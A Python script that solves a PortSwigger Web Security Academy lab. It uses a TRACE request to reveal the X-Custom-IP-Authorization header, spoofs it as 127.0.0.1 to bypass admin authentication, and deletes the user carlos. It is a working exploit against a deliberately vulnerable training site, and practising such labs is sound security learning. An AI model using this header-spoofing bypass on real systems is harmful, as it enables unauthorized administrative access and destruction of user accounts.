#!/usr/bin/env python


'''This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete Carlos's account.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
'''

import requests

lab_id = '0ac3007e03fd867c81783fcf00d400a7' # change according to generated lab_id
s = requests.Session()

# Send a TRACE request to the main page and examine the response. 

uri = f"https://{lab_id}.web-security-academy.net/"
req = requests.Request('TRACE', uri)
r = req.prepare()
resp = s.send(r)
print(resp.text)

# Notice the use of the X-Custom-IP-Authorization header. In order to admin bypass we will set the equal to localhost ip
headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
# Use the custom header to delete the carlos user
uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
resp_2 = s.get(uri, headers=headers)
print('finished')